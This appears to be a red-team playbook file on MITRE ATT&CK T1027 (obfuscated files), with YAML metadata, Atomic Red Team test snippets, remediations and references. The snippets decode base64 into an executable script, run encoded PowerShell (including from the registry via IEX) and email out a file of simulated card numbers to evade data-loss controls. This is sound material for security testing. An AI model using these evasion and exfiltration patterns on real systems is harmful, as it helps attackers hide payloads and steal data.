---
name: "T1027_obfuscated-files-or-information"
description: "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit."
category: "configuration"
version: "18.1"
author: "cyberstrike-official"
tags:
  - mitre-attack
  - enterprise
  - t1027
  - defense-evasion
  - esxi
  - linux
  - macos
  - network-devices
  - windows
technique_id: "T1027"
tactic: "defense-evasion"
all_tactics:
  - defense-evasion
platforms:
  - ESXi
  - Linux
  - macOS
  - Network Devices
  - Windows
mitre_url: "https://attack.mitre.org/techniques/T1027"
tech_stack:
  - esxi
  - linux
  - macos
  - network devices
  - windows
cwe_ids:
  - CWE-693
chains_with:
  - T1027.001
  - T1027.002
  - T1027.003
  - T1027.004
  - T1027.005
  - T1027.006
  - T1027.007
  - T1027.008
  - T1027.009
  - T1027.010
  - T1027.011
  - T1027.012
  - T1027.013
  - T1027.014
  - T1027.015
  - T1027.016
  - T1027.017
prerequisites: []
severity_boost:
  T1027.001: "Chain with T1027.001 for deeper attack path"
  T1027.002: "Chain with T1027.002 for deeper attack path"
  T1027.003: "Chain with T1027.003 for deeper attack path"
---

# T1027 Obfuscated Files or Information

## High-Level Description

Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.

Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and Deobfuscate/Decode Files or Information for User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary. Adversaries may also use compressed or archived scripts, such as JavaScript.

Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery. Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.

Adversaries may also abuse Command Obfuscation to obscure commands executed from payloads or directly via Command and Scripting Interpreter. Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.

## Kill Chain Phase

- Defense Evasion (TA0005)

**Platforms:** ESXi, Linux, macOS, Network Devices, Windows

## What to Check

- [ ] Identify if Obfuscated Files or Information technique is applicable to target environment
- [ ] Check ESXi systems for indicators of Obfuscated Files or Information
- [ ] Check Linux systems for indicators of Obfuscated Files or Information
- [ ] Check macOS systems for indicators of Obfuscated Files or Information
- [ ] Verify mitigations are bypassed or absent (4 known mitigations)
- [ ] Assess detection coverage (1 detection strategies)

## How to Test

### Atomic Red Team Tests

The following tests are from [Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) and provide actionable ways to test this technique:

### Atomic Test 1: Decode base64 Data into Script

Creates a base64-encoded data file and decodes it into an executable shell script

Upon successful execution, sh will execute art.sh, which is a base64 encoded command, that echoes `Hello from the Atomic Red Team`
and uname -v

**Supported Platforms:** macos, linux

```bash
if [ "$(uname)" = 'FreeBSD' ]; then cmd="b64decode -r"; else cmd="base64 -d"; fi;
cat /tmp/encoded.dat | $cmd > /tmp/art.sh
chmod +x /tmp/art.sh
/tmp/art.sh
```

**Dependencies:**

- encode the command into base64 file

### Atomic Test 2: Execute base64-encoded PowerShell

Creates base64-encoded PowerShell code and executes it. This is used by numerous adversaries and malicious tools.

Upon successful execution, powershell will execute an encoded command and stdout default is "Write-Host "Hey, Atomic!"

**Supported Platforms:** windows

```powershell
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand
powershell.exe -EncodedCommand $EncodedCommand
```

### Atomic Test 3: Execute base64-encoded PowerShell from Windows Registry

Stores base64-encoded PowerShell code in the Windows Registry and deobfuscates it for execution. This is used by numerous adversaries and malicious tools.

Upon successful execution, powershell will execute encoded command and read/write from the registry.

**Supported Platforms:** windows

```powershell
$OriginalCommand = '#{powershell_command}'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
$EncodedCommand =[Convert]::ToBase64String($Bytes)
$EncodedCommand

Set-ItemProperty -Force -Path #{registry_key_storage} -Name #{registry_entry_storage} -Value $EncodedCommand
powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp #{registry_key_storage} #{registry_entry_storage}).#{registry_entry_storage})))"
```

### Atomic Test 4: Execution from Compressed File

Mimic execution of compressed executable. When successfully executed, calculator.exe will open.

**Supported Platforms:** windows

```cmd
"PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe"
```

**Dependencies:**

- T1027.exe must exist on disk at PathToAtomicsFolder\..\ExternalPayloads\temp_T1027.zip\T1027.exe

### Atomic Test 5: DLP Evasion via Sensitive Data in VBA Macro over email

Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.
Sensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.

**Supported Platforms:** windows

```powershell
Send-MailMessage -From #{sender} -To #{receiver} -Subject 'T1027_Atomic_Test' -Attachments "#{input_file}" -SmtpServer #{smtp_server}
```

### Manual Testing

If Atomic Red Team tests are not applicable, manually verify the technique by:

1. **Identify Attack Surface**: Determine if the target environment is susceptible to Obfuscated Files or Information by examining the target platforms (ESXi, Linux, macOS).

2. **Assess Existing Defenses**: Review whether mitigations for T1027 are in place. If defenses are absent or misconfigured, this technique may be exploitable.

3. **Execute Test**: Use tools and methods described in the MITRE ATT&CK page and external references below.

## Remediation Guide

### M1047 Audit

Consider periodic review of common fileless storage locations (such as the Registry or WMI repository) to potentially identify abnormal and malicious data.

### M1040 Behavior Prevention on Endpoint

On Windows 10+, enable Attack Surface Reduction (ASR) rules to prevent execution of potentially obfuscated payloads.

### M1017 User Training

Ensure that a finite amount of ingress points to a software deployment system exist with restricted access for those required to allow and enable newly deployed software.

### M1049 Antivirus/Antimalware

Anti-virus can be used to automatically detect and quarantine suspicious files. Consider utilizing the Antimalware Scan Interface (AMSI) on Windows 10+ to analyze commands after being processed/interpreted.

## Detection

### Behavioral Detection of Obfuscated Files or Information

## Risk Assessment

| Finding                                              | Severity | Impact          |
| ---------------------------------------------------- | -------- | --------------- |
| Obfuscated Files or Information technique applicable | Medium   | Defense Evasion |

## CWE Categories

| CWE ID  | Title                        |
| ------- | ---------------------------- |
| CWE-693 | Protection Mechanism Failure |

## References

- [Volexity PowerDuke November 2016](https://www.volexity.com/blog/2016/11/09/powerduke-post-election-spear-phishing-campaigns-targeting-think-tanks-and-ngos/)
- [GitHub Revoke-Obfuscation](https://github.com/danielbohannon/Revoke-Obfuscation)
- [FireEye Obfuscation June 2017](https://web.archive.org/web/20170923102302/https://www.fireeye.com/blog/threat-research/2017/06/obfuscation-in-the-wild.html)
- [FireEye Revoke-Obfuscation July 2017](https://www.blackhat.com/docs/us-17/thursday/us-17-Bohannon-Revoke-Obfuscation-PowerShell-Obfuscation-Detection-And%20Evasion-Using-Science-wp.pdf)
- [GitHub Office-Crackros Aug 2016](https://github.com/itsreallynick/office-crackros)
- [Linux/Cdorked.A We Live Security Analysis](https://www.welivesecurity.com/2013/04/26/linuxcdorked-new-apache-backdoor-in-the-wild-serves-blackhole/)
- [Carbon Black Obfuscation Sept 2016](https://www.carbonblack.com/2016/09/23/security-advisory-variants-well-known-adware-families-discovered-include-sophisticated-obfuscation-techniques-previously-associated-nation-state-attacks/)
- [PaloAlto EncodedCommand March 2017](https://researchcenter.paloaltonetworks.com/2017/03/unit42-pulling-back-the-curtains-on-encodedcommand-powershell-attacks/)
- [Atomic Red Team - T1027](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1027)
- [MITRE ATT&CK - T1027](https://attack.mitre.org/techniques/T1027)
